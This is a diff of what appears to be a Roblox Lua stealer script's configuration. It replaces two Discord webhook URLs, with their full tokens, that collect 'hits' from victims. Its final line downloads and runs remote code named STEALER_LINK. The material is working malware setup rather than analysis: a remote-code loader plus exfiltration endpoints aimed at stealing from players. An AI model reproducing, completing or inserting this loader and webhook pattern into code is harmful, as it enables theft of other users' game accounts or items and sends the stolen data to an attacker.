@@ -6,7 +6,7 @@ Usernames = {
     'third',
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1269473839256174753/zijixxP3uyUUs3yXD9gtm1o7J12sF8t_QKlUAjs-AtBSESRhhfeni6beDEJ-7p7k_ul1"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1269473839256174753/zijixxP3uyUUs3yXD9gtm1o7J12sF8t_QKlUAjs-AtBSESRhhfeni6beDEJ-7p7k_ul1"
+BigHitsWebhook = "https://discord.com/api/webhooks/1346428570020610048/ERkhiA1mBhw5HWD2iCq3Jl5F4siRSlqabdGUQHq5cwy88Cx4at05Y-zoOwGWGF-veo9Y"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1346428570020610048/ERkhiA1mBhw5HWD2iCq3Jl5F4siRSlqabdGUQHq5cwy88Cx4at05Y-zoOwGWGF-veo9Y"
 
 loadstring(game:HttpGet(STEALER_LINK, true))()
